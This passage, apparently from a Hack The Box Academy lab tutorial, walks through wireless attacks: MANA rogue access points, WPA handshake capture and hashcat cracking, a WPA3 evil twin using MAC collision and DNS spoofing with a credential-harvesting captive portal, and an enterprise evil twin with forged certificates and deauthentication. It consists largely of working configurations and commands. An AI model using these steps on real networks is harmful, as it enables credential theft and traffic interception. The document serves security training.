| `hw_mode` | The hw\_mode parameter in the hostapd configuration file specifies the hardware mode (frequency band) that the access point should operate in. |
| `enable_mana` | Enables MANA mode, which is the KARMA beacon attack. This will help stations know that our access point exists, making transitions easier and our attack less intrusive. |
| `Mana_loud` | This option sets whether or not all beacons will be retransmitted to clients. If we are attempting to be stealthy, we could set this to zero. |
| `wpa=2` | Enables WPA2 security for the access point. |
| `wpa_key_mgmt` | Configures WPA2 with Pre-Shared Key (PSK) authentication. |
| `rsn_pairwise` | Specifies CCMP (AES) as the encryption method for WPA2. |
| `wpa_passphrase` | Sets the WPA2 PSK passphrase to "Anything". |

The SSID is set to `Anything` because `hostapd-mana` automatically responds to probe requests from clients, mimicking the SSIDs they are probing for. Since we are unsure of the authentication method used by the clients, we configure it to support `WPA-PSK` for both WPA1 and WPA2, allowing both TKIP and CCMP encryption methods.

We can start the MANA attack using the following command:

```shell
hostapd-mana hostapd.conf

Configuration file: hostapd.conf
rfkill: Cannot open RFKILL control device
Using interface wlan1 with hwaddr be:0c:d7:dd:82:c4 and ssid "Anything"
wlan1: interface state UNINITIALIZED->ENABLED
wlan1: AP-ENABLED

MANA - Directed probe request for SSID 'HackTheWireless' from 3a:00:0a:1b:21:24
MANA - Directed probe request for SSID 'HackMe' from 8a:eb:7e:f9:15:3e
wlan1: STA 8a:eb:7e:f9:15:3e IEEE 802.11: authenticated
wlan1: STA 8a:eb:7e:f9:15:3e IEEE 802.11: associated (aid 1)

wlan1: AP-STA-POSSIBLE-PSK-MISMATCH 8a:eb:7e:f9:15:3e
wlan1: AP-STA-POSSIBLE-PSK-MISMATCH 8a:eb:7e:f9:15:3e

```

This will create a rogue access point that responds to all probe requests from clients.

From the output, we may observe a message like `AP-STA-POSSIBLE-PSK-MISMATCH`, which indicates that a client attempted to connect to `HackMe` using WPA, but the passphrase didn’t match our configuration ( `Anything`). Despite the mismatch, we can still capture the handshake and use it to brute-force the password. To capture the handshake, we need to modify the `hostapd.conf` file and disable the `MANA` mode since `hostapd-mana` does not support WPA/WPA2 handshake capture using `MANA` mode. This is because when MANA mode is enabled, hostapd-mana cannot reliably identify the SSID the client was trying to connect to.

We update the hostapd.conf file as below:

```configuration
interface=wlan1
driver=nl80211
hw_mode=g
channel=1
ssid=HackMe
wpa=2
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP CCMP
wpa_passphrase=anything
mana_wpaout=handshake.hccapx

```

The key changes to the above config file includes the addition of `mana_wpaout=handshake.hccapx`, which saves the captured handshake to the specified file, the name of the `ssid` which client is probing for, and the removal of MANA mode, as it prevents reliable identification of the SSID being connected to. Once configured, we restart hostapd-mana with the updated configuration to capture the handshake data. This handshake can then be used for offline brute-forcing to crack the WPA passphrase.

```shell
hostapd-mana hostapd.conf

Configuration file: hostapd.conf
MANA: Captured WPA/2 handshakes will be written to file 'handshake.hccapx'.
wlan1: interface state UNINITIALIZED->ENABLED
wlan1: AP-ENABLED

wlan1: STA 8a:eb:7e:f9:15:3e IEEE 802.11: authenticated
wlan1: STA 8a:eb:7e:f9:15:3e IEEE 802.11: associated (aid 1)
MANA: Captured a WPA/2 handshake from: 8a:eb:7e:f9:15:3e
wlan1: AP-STA-POSSIBLE-PSK-MISMATCH 8a:eb:7e:f9:15:3e
MANA: Captured a WPA/2 handshake from: 8a:eb:7e:f9:15:3e
wlan1: AP-STA-POSSIBLE-PSK-MISMATCH 8a:eb:7e:f9:15:3e
MANA: Captured a WPA/2 handshake from: 8a:eb:7e:f9:15:3e
wlan1: AP-STA-POSSIBLE-PSK-MISMATCH 8a:eb:7e:f9:15:3e
MANA: Captured a WPA/2 handshake from: 8a:eb:7e:f9:15:3e
wlan1: AP-STA-POSSIBLE-PSK-MISMATCH 8a:eb:7e:f9:15:3e

```

Once the handshake is captured, we use the `hcxhash2cap` tool to convert it into a pcap file using the following command:

```shell
hcxhash2cap --hccapx=handshake.hccapx -c handshake.pcap

EAPOLs written to capfile(s): 4 (0 skipped)

```

Next, we use the `hcxpcapngtool` to convert the pcap file into a Hashcat-compatible hash format (22000) using the following command:

```shell
hcxpcapngtool handshake.pcap -o hash.22000

hcxpcapngtool 6.2.5 reading from handshake.pcap...

summary capture file
--------------------
file name................................: handshake.pcap
version (pcap/cap).......................: 2.4 (very basic format without any additional information)
timestamp minimum (GMT)..................: 24.01.2025 10:32:34
timestamp maximum (GMT)..................: 24.01.2025 10:32:34
used capture interfaces..................: 1
link layer header type...................: DLT_IEEE802_11 (105) very basic format without any additional information about the quality
endianness (capture system)...............: little endian
packets inside...........................: 12
ESSID (total unique).....................: 1
BEACON (total)...........................: 4
BEACON (detected on 2.4 GHz channel).....: 6
BEACON (hcxhash2cap).....................: 4
EAPOL messages (total)...................: 8
EAPOL RSN messages.......................: 8
EAPOLTIME gap (measured maximum usec)....: 1
EAPOL ANONCE error corrections (NC)......: not detected
REPLAYCOUNT gap (measured maximum).......: 3
EAPOL M1 messages (total)................: 4
EAPOL M2 messages (total)................: 4
EAPOL pairs (total)......................: 4
EAPOL pairs (best).......................: 1
EAPOL pairs written to combi hash file...: 1 (RC checked)
EAPOL M12E2 (challenge)..................: 1

session summary
---------------
processed cap files...................: 1

```

Finally, we use hashcat to attempt cracking the hash by specifying the attack mode (-a 0 for dictionary attack), the hash type (-m 22000 for WPA/WPA2), and the wordlist to use. The command is as follows:

```shell
sudo hashcat -a 0 -m 22000 hash.22000 /opt/wordlist.txt --force

hashcat (v6.2.5) starting
<SNIP>
deae75ba0a788660e6e8c5bdf68239d5:22b46214ca56:9e8e3aa0ccc4:StarLight-Hospital:<SNIP>

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 22000 (WPA-PBKDF2-PMKID+EAPOL)
Hash.Target......: hash.22000
Time.Started.....: Fri Jan 24 10:40:35 2025, (1 sec)
Time.Estimated...: Fri Jan 24 10:40:36 2025, (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/opt/wordlist.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:     2027 H/s (14.95ms) @ Accel:64 Loops:1024 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 490/14344384 (0.00%)
Rejected.........: 362/490 (73.88%)
Restore.Point....: 0/14344384 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: 123456789 -> manchester
Hardware.Mon.#1..: Util: 50%

```

If **Hashcat** does not work within the provided attacker VM, it is recommended to use **Pwnbox** or your **local VM** to run Hashcat.

* * *

### MANA attack on Enterprise Networks

We can extend the MANA attack to target clients probing for enterprise networks. Since we cannot determine the exact authentication method the clients are probing for, a trial-and-error approach is necessary. Previously, we targeted WPA networks, where only one client connected. This suggests the second client might be using WPA Enterprise.

To configure the rogue access point for WPA Enterprise, we use the following configuration:

```config
# 802.11 Options
interface=wlan1
ssid=Anything
channel=1
auth_algs=3
wpa_key_mgmt=WPA-EAP
wpa_pairwise=TKIP CCMP
wpa=3
hw_mode=g
ieee8021x=1

# EAP Configuration
eap_server=1
eap_user_file=/opt/hostapd-mana/hostapd.eap_user

# Certificates
ca_cert=/opt/hostapd-mana/ca.pem
server_cert=/opt/hostapd-mana/server.pem
private_key=/opt/hostapd-mana/server.key
private_key_passwd=whatever
dh_file=/opt/hostapd-mana/dh

# Mana Configuration
enable_mana=1
mana_loud=1
mana_credout=credentials.creds
mana_eapsuccess=1
mana_wpe=1

```

In this file, we specify many parameters. These parameters can be broken down like the following:

| Item | Description |
| --- | --- |
| `Interface` | The interface on which we will be hosting the access point. |
| `SSID` | The SSID of the AP we want to set |
| `Channel 1` | If our interface has the same spoofed MAC address as the target network's BSSID, we need this to be a different channel. If the MAC address of our interface is different, this can be the same channel as the target AP. |
| `eap_user_file` | This is the location of our eap user file. We will use this file to control the EAP negotiation of any client which connects to our network. Doing so will allow us to downgrade the EAP method correctly in order to retrieve weaker hashes or even plain text credentials. |
| `enable_mana` | Enables MANA mode, which is the KARMA beacon attack. This will help stations know that our access point exists, making transitions easier and our attack less intrusive. We may still need to employ deauthentication later. |
| `Mana_loud` | This option sets whether or not all beacons will be retransmitted to clients. If we are attempting to be stealthy, we could set this to zero. |
| `Mana_credout` | The location where we will be storing any captured credentials or hashes. |
| `Mana_WPE` | Enables EAP credential capture mode, which is what we need in order to receive client credentials. |
| `Certificate Configuration` | We must include the location of our different SSL certs which we will generate later. This is due to the cert requirements for the TTLS-PAP and GTC modes respectively among others. |

We will delve into the details of how these `certificates` are generated and explain the contents of the `hostapd.eap_user` file in the upcoming section titled `Enterprise Evil Twin Attack`.

Once the configuration is ready, we run the `hostapd-mana` command followed by config file to start the rogue AP and capture the credentials.

```shell
hostapd-mana hostapd.conf

MANA: Captured credentials will be written to file 'credentials.creds'.
Using interface wlan1 with hwaddr 22:b4:62:14:ca:56 and ssid "Anything"
wlan1: interface state UNINITIALIZED->ENABLED
wlan1: AP-ENABLED
MANA - Directed probe request for SSID 'HackTheWireless' from 3a:00:0a:1b:21:24
MANA - Directed probe request for SSID 'HackMe' from 8a:eb:7e:f9:15:3e
wlan1: STA 3a:00:0a:1b:21:24 IEEE 802.11: authenticated
wlan1: STA 3a:00:0a:1b:21:24 IEEE 802.11: associated (aid 1)
wlan1: CTRL-EVENT-EAP-STARTED 2e:c7:73:68:50:82
wlan1: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=1
MANA EAP Identity Phase 0: HTB\<SNIP>
wlan1: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=21
MANA EAP Identity Phase 1: HTB\<SNIP>
MANA EAP GTC | HTB\\<SNIP>:<SNIP>

```


# Evil Twin Attack on WPA3

* * *

Performing an evil twin attack on a WPA3 network is similar to attacking a WPA2 network, but it comes with additional challenges due to the enhanced security features of WPA3. In WPA2 networks, an attacker typically creates an open network with the same BSSID as the target network and uses tools like `aireplay-ng` to deauthenticate connected clients. This forces the clients to reconnect, resulting in them connecting to the attacker’s rogue access point.

![intro](https://academy.hackthebox.com/storage/modules/291/intro/002.png)

In WPA3 networks, traditional deauthentication attacks are ineffective due to the implementation of 802.11w (Protected Management Frames, PMF). [PMF](https://wlan1nde.wordpress.com/2014/10/21/protected-management-frames-802-11w/) authenticates management frames like `deauthentication packets`, making such attacks useless. To bypass this protection, attackers can create a denial-of-service (DoS) condition to disrupt connections to the legitimate access point. This can be achieved through techniques like `MAC collisions` and the `Loud MANA` attack, where a rogue access point mimics the target network's BSSID and ESSID.

Although the attacker does not have the correct password for the target AP, it still disrupts legitimate connections, potentially confusing clients. The attacker would set up two rogue access points, one with `WPA2` authentication mirroring the legitimate AP to create collision events and another with `open` rogue AP to encourage manual client connections. This approach is particularly effective on clients attempting to reconnect to the network.

![wpa3](https://academy.hackthebox.com/storage/modules/291/wpa3/wpa3.png)

* * *

### Enumeration

To perform the Evil Twin attack, we will need three WLAN interfaces:

- `wlan0` : Set to monitor mode to scan the target network and identify clients and access points.
- `wlan1` : Configured in master mode to host a fake access point (AP) with the same BSSID as the target, creating a collision event.
- `wlan2` : Also configured in master mode to host an open-network access point, where clients will connect after being deauthenticated from the target network.

```shell
iwconfig

wlan0     IEEE 802.11  ESSID:off/any
          Mode:Managed  Access Point: Not-Associated   Tx-Power=20 dBm
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Encryption key:off
          Power Management:on

wlan1     IEEE 802.11  ESSID:off/any
          Mode:Managed  Access Point: Not-Associated   Tx-Power=20 dBm
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Encryption key:off
          Power Management:on

wlan2     IEEE 802.11  ESSID:off/any
          Mode:Managed  Access Point: Not-Associated   Tx-Power=20 dBm
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Encryption key:off
          Power Management:on

wlan3     IEEE 802.11  ESSID:off/any
          Mode:Managed  Access Point: Not-Associated   Tx-Power=20 dBm
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Encryption key:off
          Power Management:on

```

We begin by enabling monitor mode on our `wlan0` interface using `airmon-ng`.

```shell
airmon-ng start wlan0

Found 4 processes that could cause trouble.
Kill them using 'airmon-ng check kill' before putting
the card in monitor mode, they will interfere by changing channels
and sometimes putting the interface back in managed mode

    PID Name
    184 avahi-daemon
    204 wpa_supplicant
    208 avahi-daemon
    231 NetworkManager

PHY	Interface	Driver		Chipset

phy1	wlan0		htb80211_chipset	HTB ChipSet of 802.11 radio(s) for mac80211

		(mac80211 monitor mode vif enabled for [phy1]wlan0 on [phy1]wlan0mon)
		(mac80211 station mode vif disabled for [phy1]wlan0)
phy3	wlan1		htb80211_chipset	HTB ChipSet of 802.11 radio(s) for mac80211
phy4	wlan2		htb80211_chipset	HTB ChipSet of 802.11 radio(s) for mac80211
phy5	wlan3		htb80211_chipset	HTB ChipSet of 802.11 radio(s) for mac80211

```

Once our interface is in monitor mode, we can use `airodump-ng` to scan for available Wi-Fi networks and their associated clients.

```shell
 CH  1 ][ Elapsed: 6 s ][ 2024-12-20 10:32

 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID
 9C:9A:03:39:BD:7A  -47        7        2    0   1   54   WPA3 CCMP   SAE  HTB-Corp

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes
 9C:9A:03:39:BD:7A  62:BD:99:A1:9E:1B  -29    0 - 1      6        2

```

From the output above, we can observe that the `HTB-Corp` Wi-Fi network is active with the BSSID `9C:9A:03:39:BD:7A` and has a client connected with the MAC address `62:BD:99:A1:9E:1B`. Next, we'll proceed with the Evil Twin attack to attempt luring the client into connecting to our open-network access point, aiming to capture their clear-text credentials.

* * *

## Performing the Attack

Since Wi-Fi operates over the wireless medium at the Physical Layer, it depends on MAC addresses from the Data-Link Layer for communication. By spinning up a rogue AP with the same MAC address (BSSID) as the legitimate access point (AP), we can intentionally create collision events. If the rogue AP's signal strength is stronger than the legitimate AP's, client devices will be unable to connect to the legitimate network, effectively denying service. This forms the foundation of our Evil-Twin Attack strategy.

* * *

#### General steps for WPA3 Evil-Twin Attack

1. `Deny Service to the Legitimate AP`: Configure the rogue access point’s BSSID to match the target AP’s BSSID and set the same SSID (network name). Enable the MANA loud option to retransmit beacon frames aggressively, amplifying the effect. Use MANA attack to disrupt client connections to the legitimate access point, forcing them to seek alternative networks.
2. `Deploy an Open-Network` AP: Set up a rogue access point configured as an open network to entice disconnected clients into connecting. This access point should mimic the legitimate AP’s SSID and channel for authenticity
3. `Harvest and Validate Credentials`: Once clients connect to the rogue access point, capture their authentication attempts. Extract and validate credentials to determine their validity and potential use.

The captive portal is already pre-configured within the lab environment, allowing direct focus on executing the attack and analyzing the results without needing to set up and configure the entire infrastructure manually.

### 1\. Deny Service to the Legitimate AP

With IEEE 802.11w, we know that beacon frames remain unprotected. This allows us to leverage a `MANA` attack to increase the effectiveness of client enticement and enforcement. The `mana_loud` option would ensure that all beacon frames are retransmitted to clients, amplifying the attack’s impact.

The key to this attack is setting the channel and BSSID of our rogue access point to match the target access point. The PSK does not play a significant role as long as it is configured for WPA2, allowing us to disrupt and lure clients effectively.

To get started, we need to create a `mac.conf` file with following contents.

```configuration
ssid=HTB-Corp
interface=wlan1
channel=1
hw_mode=g

# Mana Attack Configuration
enable_mana=1
mana_loud=1

# WPA AP Configuration
wpa=2
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
wpa_passphrase=PSKmismatchmaker

```

In this file, we specify many parameters. These parameters can be broken down like the following:

| Item | Description |
| --- | --- |
| `SSID` | This needs to be the same as the SSID of the target network |
| `Interface` | The interface which we will be hosting the access point on. |
| `Channel` | Configures the access point to operate on selected Wi-Fi channel |
| `hw_mode` | The hw\_mode parameter in the hostapd configuration file specifies the hardware mode (frequency band) that the access point should operate in. |
| `enable_mana` | Enables MANA mode, which is the KARMA beacon attack. This will help stations know that our access point exists, making transitions easier and our attack less intrusive. |
| `Mana_loud` | This option sets whether or not all beacons will be retransmitted to clients. If we are attempting to be stealthy, we could set this to zero. |
| `wpa=2` | Enables WPA2 security for the access point. |
| `wpa_key_mgmt` | Configures WPA2 with Pre-Shared Key (PSK) authentication. |
| `rsn_pairwise` | Specifies CCMP (AES) as the encryption method for WPA2. |
| `wpa_passphrase` | Sets the WPA2 PSK passphrase to "PSKmismatchmaker". |

Next, we use macchanger to modify the MAC address of the wlan1 interface, ensuring it matches the target AP's BSSID. This step is crucial for creating the MAC collision necessary to disrupt the legitimate AP's functionality.

```shell
ifconfig wlan1 down

```

```shell
macchanger -m 9C:9A:03:39:BD:7A wlan1

Current MAC:   66:e9:37:38:1c:49 (unknown)
Permanent MAC: 66:e9:37:38:1c:49 (unknown)
New MAC:       9c:9a:03:39:bd:7a (unknown)

```

```shell
ifconfig wlan1 up

```

Now, to start the fake access point, we will use [hostapd-mana](https://github.com/sensepost/hostapd-mana) which is an excellent tool for this purpose, as it supports `KARMA/MANA` attacks, negotiable EAP methods, and other valuable features. We use the command `hostapd-mana mac.conf` to start our fake access point. This rogue AP will generate collision events, effectively blocking legitimate clients from accessing the target access point.

```shell
hostapd-mana mac.conf
Configuration file: mac.conf
rfkill: Cannot open RFKILL control device
Using interface wlan1 with hwaddr 9C:9A:03:39:BD:7A and ssid "HTB-Corp"
random: Only 19/20 bytes of strong random data available from /dev/random
random: Not enough entropy pool available for secure operations
WPA: Not enough entropy in random pool for secure operations - update keys later when the first station connects
wlan1: interface state UNINITIALIZED->ENABLED
wlan1: AP-ENABLED
Unsupported authentication algorithm (3)
handle_auth_cb: STA 62:bd:99:a1:9e:1b not found
MANA - Directed probe request for SSID 'HTB-Corp' from 62:bd:99:a1:9e:1b
MANA - Directed probe request for SSID 'HTB-Corp' from 62:bd:99:a1:9e:1b

```

### 2\. Deploy an Open-Network AP

Next, we set up a rogue access point configured as an open network to attract disconnected clients. This rogue AP will mimic the legitimate AP's SSID and channel to appear authentic. To begin, we create an `open.conf` file with the following contents:

```configuration
interface=wlan2
hw_mode=g
ssid=HTB-Corp
channel=1
driver=nl80211

```

This configuration ensures that the rogue AP is broadcasting the same SSID on the same channel as an open network.

Next, we create a configuration file for the DNS server to manage IP assignments and DNS resolution for clients connecting to the rogue access point. For this, we create an `dns.conf` file with the following contents:

```configuration
interface=wlan2
dhcp-range=192.168.0.2,192.168.0.254,255.255.255.0,10h
dhcp-option=3,192.168.0.1
dhcp-option=6,192.168.0.1
server=8.8.4.4
server=8.8.8.8
listen-address=127.0.0.1
address=/#/192.168.0.1
log-dhcp
log-queries

```

In the above config file, the `dhcp-range` defines the range of IPs to be assigned to clients, `dhcp-option` sets the default gateway (option 3) and DNS server (option 6), `server` points to the DNS servers (Google DNS in this case) and `address` forces all domain queries to redirect to the rogue IP address (192.168.0.1). This configuration will ensure clients that connect to the rogue AP are given IPs in the defined range and are redirected to the attacker's DNS server.

To start the DNS server with our configuration, we first stop any running dnsmasq service to avoid conflicts by using the command shown below:

```shell
service dnsmasq stop

```

Next, we execute the DNS configuration file and start the DNS server on port 53 using:

```shell
sudo dnsmasq -C dns.conf -d

dnsmasq: started, version 2.90 cachesize 150
dnsmasq: compile time options: IPv6 GNU-getopt DBus no-UBus i18n IDN2 DHCP DHCPv6 no-Lua TFTP conntrack ipset no-nftset auth cryptohash DNSSEC loop-detect inotify dumpfile
dnsmasq-dhcp: DHCP, IP range 192.168.0.2 -- 192.168.0.254, lease time 10h
dnsmasq: using nameserver 8.8.4.4#53
dnsmasq: using nameserver 8.8.8.8#53
dnsmasq: reading /etc/resolv.conf
dnsmasq: using nameserver 8.8.4.4#53
dnsmasq: using nameserver 8.8.8.8#53
dnsmasq: using nameserver 1.1.1.1#53
dnsmasq: read /etc/hosts - 7 names

```

This will initiate the rogue DNS server, ensuring that client devices connecting to the fake AP will receive their IP addresses and DNS settings from our attacker-controlled network.

The next step is to configure the valid IP address for the interface that will host the fake access point ( `wlan1`).

```shell
sudo ifconfig wlan2 192.168.0.1/24
ifconfig wlan2
wlan2: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        inet 192.168.0.1  netmask 255.255.255.0  broadcast 192.168.0.255
        ether 02:00:00:00:03:00  txqueuelen 1000  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

```

Additionally, we need to ensure that IP forwarding is enabled on the machine to allow proper routing of traffic between the fake access point and the internet.

```shell
echo 1 > /proc/sys/net/ipv4/ip_forward

```

Next, we start dnsspoof on the `wlan2` interface to redirect all traffic from the victim's device to our attacker's IP address. This step allows us to intercept and monitor the client's communications.

```shell
dnsspoof -i wlan2

dnsspoof: listening on wlan2 [udp dst port 53 and not src 192.168.0.1]

```

Finally, we execute hostapd with the open.conf file to start the rogue open network. This will broadcast the fake access point, enticing disconnected clients to connect. Use the following command:

```shell
hostapd open.conf

rfkill: Cannot open RFKILL control device
wlan2: interface state UNINITIALIZED->ENABLED
wlan2: AP-ENABLED
wlan2: STA 62:bd:99:a1:9e:1b IEEE 802.11: authenticated
wlan2: STA 62:bd:99:a1:9e:1b IEEE 802.11: associated (aid 1)
wlan2: AP-STA-CONNECTED 62:bd:99:a1:9e:1b
wlan2: STA 62:bd:99:a1:9e:1b RADIUS: starting accounting session 31FF3C4EF15F915F

```

### 3\. Harvest and Validate Credentials

Once the client connects to our rogue open access point, they will be presented with a captive portal designed to mimic the legitimate login page. This setup enables us to harvest the client's credentials when they attempt to authenticate. The captive portal intercepts their login attempt, allowing us to capture the password in clear text for further use.

![wpa3](https://academy.hackthebox.com/storage/modules/291/captive_wpa3.PNG)

If a user enters their password a POST request is sent to `received.php`. The `received.php` file simply takes the user input and writes it to `passes.lst`, our dictionary. We will be using this dictionary later in order to validate the captured pre-shared keys against the handshake with CowPatty. When testing this form, if an error message is displayed by received.php, it is commonly a permissions issue, which can be resolved with the following command.

```shell
cat /var/www/html/passes.lst

<SNIP>

```


# Enterprise Evil Twin Attack

* * *

Performing an evil twin attack on WPA Enterprise networks differs significantly from attacks on WPA2 or WPA3 networks. Unlike the latter, where a shared pre-shared key (PSK) is used, WPA Enterprise assigns each user their own unique set of credentials. To execute the attack, the attacker sets up a rogue enterprise access point (AP) configured with a RADIUS server. This rogue RADIUS server is designed to accept all authentication requests, regardless of validity. Additionally, the rogue AP is given an identical name (SSID) to the legitimate AP, making it more likely that users will unknowingly connect to it.

![enterprise](https://academy.hackthebox.com/storage/modules/291/enterprise/enterprise.png)

If users connect using challenge-response-based authentication methods such as `CHAP`, `MSCHAP`, or `MSCHAPv2`, we can capture their authentication hashes. These hashes can then be brute-forced locally to recover the credentials or used in a `PEAP relay attack` to forward the captured hash to the legitimate access point (AP) for authentication. For users connecting with plain-text authentication methods like `GTC`, their credentials can be obtained directly in clear text. However, if users connect using certificate-based authentication methods like `EAP-TLS`, we can assess whether their devices are improperly configured to trust a rogue AP with a fraudulent certificate. If they are vulnerable, we can exploit this misconfiguration to perform man-in-the-middle (MITM) attacks once they are connected to the rogue AP.

For a detailed exploration of these attacks and how they work, check out the [Attacking WPA/WPA2 Wi-Fi Networks](https://academy.hackthebox.com/module/details/282) module. It provides in-depth insights and practical guidance for understanding and implementing these techniques effectively.

Here are the five steps to perform the attack:

1. `Scan for the Target`: Identify the target access point by discovering its SSID and other details.
2. `Generate Certificates`: Create certificates that closely mimic the target’s certificate details to increase the likelihood of users trusting the rogue AP.
3. `Host the Rogue AP`: Set up a rogue access point using tools like hostapd-mana or hostapd-wpe to replicate the target network.
4. `Deauthenticate Connected Clients`: Send deauthentication packets to disconnect users from the legitimate access point, forcing them to connect to the rogue AP.
5. `Capture the Credentials`: Collect user credentials or authentication hashes depending on the method used by the clients (e.g., clear text for GTC or hashes for MSCHAPv2).

* * *

## Performing the attack

### 1\. Scan for the Target

The first step is to identify the target access point by discovering its SSID and gathering additional details, such as its certificate information. This helps ensure the rogue AP closely mimics the legitimate one, increasing the likelihood of user connections. To start capturing WPA handshake data, once we've our interface in monitor mode, we can use `airodump-ng` with the `-w` WPA argument to save the scan output into a file with the WPA prefix. This process will create a `WPA-01.cap` file, which will automatically update with new data as the scan continues.

```shell
airmon-ng start wlan0

```

```shell
airodump-ng wlan0mon -c 1 -w WPA

 CH  1 ][ Elapsed: 36 s ][ 2024-08-23 10:19 ]

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 9C:9A:03:39:BD:7A  -28 100      372       77    0   1   54   WPA2 CCMP   MGT  HTB-Wireless

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 9C:9A:03:39:BD:7A  9A:B7:A6:32:F3:D6  -29    9 -48      0       95  PMKID  HTB-Wireless

```

```shell
aireplay-ng -0 1  -a 9C:9A:03:39:BD:7A -c 9A:B7:A6:32:F3:D6 wlan0mon

19:41:12  Waiting for beacon frame (BSSID: 9C:9A:03:39:BD:7A) on channel 1
19:41:12  Sending 64 directed DeAuth (code 7). STMAC: [9A:B7:A6:32:F3:D6] [ 0| 0 ACKs]
19:41:12  Sending 64 directed DeAuth (code 7). STMAC: [9A:B7:A6:32:F3:D6] [ 0| 0 ACKs]
19:41:12  Sending 64 directed DeAuth (code 7). STMAC: [9A:B7:A6:32:F3:D6] [ 0| 0 ACKs]

```

Once we have captured the WPA handshake, we can use the `WPA-01.cap` file to extract important details such as the username, domain name, and handshake certificate from the captured data. To obtain the handshake certificate using `Wireshark`, we can apply the filter `(wlan.sa == 9c:9a:03:39:bd:7a) && (tls.handshake.certificate)`. This filter focuses on the AP's BSSID to isolate the relevant packet containing the certificate. The extracted certificate can provide valuable information about the access point as shown in the below screenshot.

![handshake](https://academy.hackthebox.com/storage/modules/291/handshake.png)

* * *

### 2\. Generate Certificates

Next, we generate certificates that closely mimic the details of the target’s certificate. This similarity increases the chances of clients trusting and connecting to the rogue access point. The first step is to generate our Diffie-Hellman parameters. This can be done using the following command:

```shell
openssl dhparam -out dh.pem 2048

Generating DH parameters, 2048 bit long safe prime
..........................................................................................................................................................................................................................................................................................+......................................................................++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*

```

Next, we need to generate our Certificate Authority (CA) key. This can be accomplished with the following command:

```shell
openssl genrsa -out ca-key.pem 2048

```

We also need to generate the x509 certificate to create our final ca.pem file. We'll aim to closely match the details of the legitimate access point, to minimize suspicion from connected clients and prevent them from realizing it's a fake AP.

```shell
openssl req -new -x509 -nodes -days 100 -key ca-key.pem -out ca.pem

You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:US
State or Province Name (full name) [Some-State]:California
Locality Name (eg, city) []:San Fransisco
Organization Name (eg, company) [Internet Widgits Pty Ltd]:Hack The Box
Organizational Unit Name (eg, section) []:HTB
Common Name (e.g. server FQDN or YOUR name) []:HTB
Email Address []:[email protected]

```

When generating our x509 certificates, we should aim to make the information as similar as possible to that of the actual target. If we have access to a certificate from the internal network, using it would be preferable to self-signed certificates, as it may be trusted by the client devices.

At this stage, we need to generate our server certificate and private key, as specified in the hostapd.conf file. This can be done with the following command:

```shell
openssl req -newkey rsa:2048 -nodes -days 100 -keyout server-key.pem -out server-key.pem

Ignoring -days without -x509; not generating a certificate
.....+......+.....+....+++++++++++++++++++++++++++++++++++++++*......+....+...+..+.+..+++++++++++++++++++++++++++++++++++++++*.+..+.......+..+......+...+.+...+........+...+....+...+.....+....+...+.....+.+..+...+....+.......
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:US
State or Province Name (full name) [Some-State]:California
Locality Name (eg, city) []:San Fransisco
Organization Name (eg, company) [Internet Widgits Pty Ltd]:Hack The Box
Organizational Unit Name (eg, section) []:HTB
Common Name (e.g. server FQDN or YOUR name) []:HTB
Email Address []:[email protected]

Please enter the following 'extra' attributes
to be sent with your certificate request
A challenge password []:challenge1234
An optional company name []:

```

We should ensure that the information in our new x509 certificate matches the details from the previous certificate, as this will make our attack appear more legitimate. Additionally, the challenge password used should match the one specified in the .eap\_user file. Finally, we need to generate the x509 certificate for the server. This can be done with the following command:

```shell
openssl x509 -req -days 100 -set_serial 01 -in server-key.pem -out server.pem -CA ca.pem -CAkey ca-key.pem

Certificate request self-signature ok
subject=C=US, ST=California, L=San Fransisco, O=Hack The Box, OU=HTB, CN=HTB, [email protected]

```

* * *

### 3\. Host the Rogue AP

Now, we finally host our rogue enterprise access point. We can use tools like [Hostapd-mana](https://github.com/sensepost/hostapd-mana) or [hostapd-wpe](https://github.com/aircrack-ng/aircrack-ng/tree/master/patches/wpe/hostapd-wpe) to set up the rogue AP and replicate the target network's behavior.

To get started, we need to create a hostapd.conf file with the following content:

```configuration
# 802.11 Options
interface=wlan1
ssid=HTB-Wireless
channel=1
auth_algs=3
wpa_key_mgmt=WPA-EAP
wpa_pairwise=TKIP CCMP
wpa=3
hw_mode=g
ieee8021x=1

# EAP Configuration
eap_server=1
eap_user_file=hostapd.eap_user

# Certificates

ca_cert=ca.pem
server_cert=server.pem
private_key=server-key.pem
private_key_passwd=whatever
dh_file=dh.pem

```

Next, to gain refined control over EAP method negotiation between our fake access point and the client, we need to create the `hostapd.eap_user` file referenced in our hostapd.conf file for Mana with the following content:

```configuration
